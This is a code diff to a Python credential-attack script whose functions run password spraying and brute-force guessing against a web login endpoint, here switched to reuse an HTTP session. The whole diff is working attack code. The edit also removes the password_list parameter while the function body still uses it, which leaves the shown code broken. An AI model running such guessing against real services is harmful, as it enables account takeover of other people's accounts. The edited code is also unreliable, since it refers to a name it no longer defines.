@@ -47,14 +47,15 @@ def password_spraying(
     print(f"[*] Target: {server_url}/{endpoint}")
     print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
     print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
-    
+    session = requests.Session()
     # Try each password against all users
     for password in passwords:
         print(f"\n[*] Trying password: '{password}'")
         
         for username in usernames:
             try:
-                response = requests.post(
+                print(f"\n[*] Trying user: '{username}'")
+                response = session.post(
                     f"{server_url}{endpoint}",
                     json={"username": username, "password": password}
                 )
@@ -73,7 +74,6 @@ def password_spraying(
 def brute_force_attack(
     server_url: str,
     target_username: str,
-    password_list: List[str] = None,
     max_attempts: int = None,
     endpoint: str = "/login"
 ):
@@ -98,7 +98,7 @@ def brute_force_attack(
     print(f"[*] Target: {server_url}")
     print(f"[*] Target username: '{target_username}'")
     print(f"[*] Password list size: {len(password_list)}")
-    
+    session = requests.Session()
     attempts = 0
     for i, password in enumerate(password_list, 1):
         # Check if we've reached max_attempts
@@ -112,7 +112,7 @@ def brute_force_attack(
             print(f"[*] Progress: {i}/{len(password_list)} attempts...")
         
         try:
-            response = requests.post(
+            response = session.post(
                 login_url,
                 json={"username": target_username, "password": password},
                 timeout=const.DEFAULT_TIMEOUT
